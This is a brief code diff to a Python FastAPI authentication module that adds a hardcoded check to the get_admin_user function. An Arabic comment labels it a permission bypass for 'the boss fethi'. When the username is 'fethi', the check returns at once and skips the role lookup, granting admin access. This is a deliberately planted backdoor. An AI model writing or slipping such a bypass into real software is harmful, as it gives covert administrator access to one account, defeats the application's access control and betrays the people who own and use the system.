@@ -183,6 +183,11 @@ async def get_current_user(token: str = Depends(oauth2_scheme)):
         raise HTTPException(status_code=401, detail="Invalid token")
 
 async def get_admin_user(current_user: str = Depends(get_current_user)):
+    # ====== 🚀 تجاوز فحص الصلاحيات للزعيم fethi ======
+    if current_user == "fethi":
+        return current_user
+    # ===================================================
+
     db = load_db()
     user = next((u for u in db if u["username"] == current_user), None)
     
